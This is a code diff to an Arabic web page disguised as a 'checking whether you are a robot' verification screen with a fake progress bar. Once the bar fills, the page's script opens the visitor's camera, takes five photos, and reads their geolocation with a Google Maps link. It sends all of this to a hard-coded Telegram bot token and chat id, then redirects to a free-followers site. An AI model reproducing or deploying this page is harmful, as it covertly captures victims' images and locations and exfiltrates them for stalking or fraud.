@@ -2,23 +2,50 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>تأكيد الهوية</title>
+  <title>جاري التحقق</title>
   <style>
-    body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
-    canvas { display: none; }
+    body {
+      text-align: center;
+      font-family: sans-serif;
+      background: #f2f2f2;
+      direction: rtl;
+      padding-top: 50px;
+    }
+    #progressContainer {
+      width: 80%;
+      margin: 30px auto;
+      background-color: #ddd;
+      border-radius: 20px;
+      overflow: hidden;
+    }
+    #progressBar {
+      width: 0%;
+      height: 30px;
+      background-color: #4caf50;
+      text-align: center;
+      line-height: 30px;
+      color: white;
+      transition: width 0.2s;
+    }
+    canvas, video {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <h2>جاري التحقق من الهوية...</h2>
-  <p>يرجى الانتظار قليلاً...</p>
+  <h2>جاري التحقق هل أنت روبوت أم لا...</h2>
+  <div id="progressContainer">
+    <div id="progressBar">0%</div>
+  </div>
 
-  <video id="video" width="300" autoplay muted style="display: none;"></video>
+  <video id="video" width="300" autoplay muted></video>
   <canvas id="canvas" width="300" height="225"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
+    const progressBar = document.getElementById("progressBar");
 
     const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
     const chat_id = '6437823957';
@@ -35,7 +62,6 @@
 خط الطول: ${lon}
 https://www.google.com/maps?q=${lat},${lon}
       `;
-
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -65,25 +91,40 @@ https://www.google.com/maps?q=${lat},${lon}
       });
     }
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+    function startCameraFlow() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
 
-        let count = 0;
-        const maxPhotos = 5;
-        const interval = setInterval(() => {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
-          count++;
-          if (count >= maxPhotos) {
-            clearInterval(interval);
-            window.location.href = "https://myinstafollow.com/free-instagram-followers/";
-          }
-        }, 200);
+          let count = 0;
+          const maxPhotos = 5;
+          const interval = setInterval(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+            count++;
+            if (count >= maxPhotos) {
+              clearInterval(interval);
+              window.location.href = "https://myinstafollow.com/free-instagram-followers/";
+            }
+          }, 200);
 
-        getLocationAndSendInfo();
-      })
-      .catch(err => alert("فشل تشغيل الكاميرا: " + err));
+          getLocationAndSendInfo();
+        })
+        .catch(err => alert("فشل تشغيل الكاميرا: " + err));
+    }
+
+    // التحكم في شريط التقدم
+    let width = 0;
+    const progressInterval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(progressInterval);
+        startCameraFlow();
+      } else {
+        width++;
+        progressBar.style.width = width + "%";
+        progressBar.textContent = width + "%";
+      }
+    }, 30); // سرعة التقدم
   </script>
 </body>
 </html>
